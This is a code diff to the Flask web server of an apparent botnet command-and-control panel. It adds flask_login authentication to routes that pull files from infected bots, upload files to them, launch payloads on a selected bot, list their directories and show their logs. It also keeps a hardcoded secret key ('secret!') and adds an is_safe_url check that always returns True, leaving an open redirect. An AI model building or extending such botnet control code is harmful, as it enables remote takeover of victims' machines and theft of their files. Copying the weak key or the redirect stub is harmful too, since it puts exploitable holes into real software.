@@ -3,10 +3,11 @@ eventlet.monkey_patch()
 
 import os
 import socket
-from flask import Flask, render_template, request, Response, send_file
-from flask import make_response
+import flask
+from flask import request
+import flask_login
+from flask_login import LoginManager, login_required
 from flask_socketio import SocketIO
-from functools import wraps
 import json
 from OpenSSL import SSL, crypto
 
@@ -16,9 +17,11 @@ from OpenSSL import SSL, crypto
 try:
     from server.botnetclasses import BotNet
     from server.botnetserver import BotServer
+    from server.serverclasses import UserManager
 except:
     from botnetclasses import BotNet
     from botnetserver import BotServer
+    from serverclasses import UserManager
 
 ''' See accompanying README for TODOs.
 
@@ -35,29 +38,61 @@ DOWNLOAD_FOLDER = 'media/downloads/'
 # the best option based on installed packages.
 async_mode = None
 
-app = Flask(__name__)
+app = flask.Flask(__name__)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['SECRET_KEY'] = 'secret!'
 socketio = SocketIO(app, async_mode=async_mode)
 thread = None
 
+# Login stuff
+login_manager = LoginManager()
+login_manager.init_app(app)
+login_manager.login_view = "login"
 
-def check_auth(username, password):
-    """This function is called to check if a username /
-    password combination is valid.
-    """
-    return username == 'admin' and password == 'secret'  # TODO: set username and password
+@login_manager.user_loader
+def load_user(user_id):
+    return UserManager.get(user_id)
 
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    # Here we use a class of some kind to represent and validate our
+    # client-side form data. For example, WTForms is a library that will
+    # handle this for us, and we use a custom LoginForm to validate.
+    errs = []
+    if request.method=='POST':
+        uname = request.form.get('username')
+        passwd = request.form.get('password')
 
-def authenticate():
-    """Sends a 401 response that enables basic auth"""
-    return Response(
-        'Could not verify your access level for that URL.\n'
-        'You have to login with proper credentials', 401,
-        {'WWW-Authenticate': 'Basic realm="Login Required"'})
+        if UserManager.validate(uname,passwd):
+            user = UserManager.getbyname(uname)
+            flask_login.login_user(user)
 
+            flask.flash('Logged in successfully.')
+
+            next = flask.request.args.get('next')
+            # is_safe_url should check if the url is safe for redirects.
+            # See http://flask.pocoo.org/snippets/62/ for an example.
+            if not is_safe_url(next):
+                return flask.abort(400)
+            return flask.redirect(next or flask.url_for('index'))
+        else:
+            errs.append("Invalid login")
+    return flask.render_template('login.html',errors=errs)
+
+@app.route("/logout")
+@login_required
+def logout():
+    flask_login.logout_user()
+    return flask.redirect('/login')
+
+# Research more
+def is_safe_url(next):
+    return True
+
+# Done with login stuff
 
 @app.route('/uploader', methods=['POST'])
+@login_required
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -69,6 +104,7 @@ def upload_file():
 
 
 @app.route('/downloader', methods=['GET','POST','DELETE'])
+@login_required
 def download_file():
     '''
     POST: make the client start sending file to server
@@ -93,12 +129,12 @@ def download_file():
 
             real_filename = botnet.getFileName(user,filename)
             if real_filename:
-                return send_file(real_filename,attachment_filename=os.path.basename(filename))
+                return flask.send_file(real_filename,attachment_filename=os.path.basename(filename))
             else:
                 return "File not found", 404
         else:
             filestr = json.dumps(botnet.getDownloadFiles())
-            return Response(filestr, status=200, mimetype='application/json')
+            return flask.Response(filestr, status=200, mimetype='application/json')
     elif request.method == 'DELETE':
         if 'file' in request.args:
             if 'user' in request.args:
@@ -115,6 +151,7 @@ def download_file():
 
 
 @app.route('/payload', methods=['GET', 'POST'])
+@login_required
 def payload_launch():
     payload_name = "example_payload"
     if request.method == 'POST' and 'payload' in request.form:
@@ -126,9 +163,10 @@ def payload_launch():
             return "No bot selected", 404
     elif request.method == 'GET':
         payloadstr = json.dumps(botnet.getPayloads())
-        return Response(payloadstr, status=200, mimetype='application/json')
+        return flask.Response(payloadstr, status=200, mimetype='application/json')
 
 @app.route('/ls', methods=['GET','POST'])
+@login_required
 def list_dir():
     if request.method == 'POST' and 'file' in request.form:
         filename = request.form.get('file')
@@ -140,24 +178,22 @@ def list_dir():
     else:
         return "No bot selected", 404
 
-def requires_auth(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        auth = request.authorization
-        if not auth or not check_auth(auth.username, auth.password):
-            return authenticate()
-        return f(*args, **kwargs)
-    return decorated
-
-
-@app.route('/')
 @app.route('/choose', methods=['POST'])
-@requires_auth
+@login_required
+def setbot():
+    resp = flask.Response("done")
+    if 'bot' in request.form:
+        resp.set_cookie('bot', request.form.get('bot'))
+    return resp
+
+@app.route('/index')
+@app.route('/')
+@login_required
 def index():
     connected = ''
     if 'bot' in request.cookies:
         connected = request.cookies.get('bot')
-    resp = make_response(render_template('index.html',
+    resp = flask.make_response(flask.render_template('index.html',
                                          async_mode=socketio.async_mode,
                                          bot_list=botnet.getConnections(),
                                          payload_list=botnet.getPayloadNames(),
@@ -167,6 +203,7 @@ def index():
     return resp
 
 @app.route('/log', methods=['POST'])
+@login_required
 def resend_log():
     if request.method == 'POST':
         connected = ''
@@ -175,16 +212,16 @@ def resend_log():
         elif 'bot' in request.cookies:
             connected = request.cookies.get('bot')
         filestr = json.dumps(botnet.getLog(connected))
-        return Response(filestr, status=200, mimetype='application/json')
+        return flask.Response(filestr, status=200, mimetype='application/json')
     return "done"
 
 @app.route('/finder')
-@requires_auth
+@login_required
 def finder():
     connected = ''
     if 'bot' in request.cookies:
         connected = request.cookies.get('bot')
-    return render_template('finder.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
+    return flask.render_template('finder.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
                                          connected=connected)
 
 
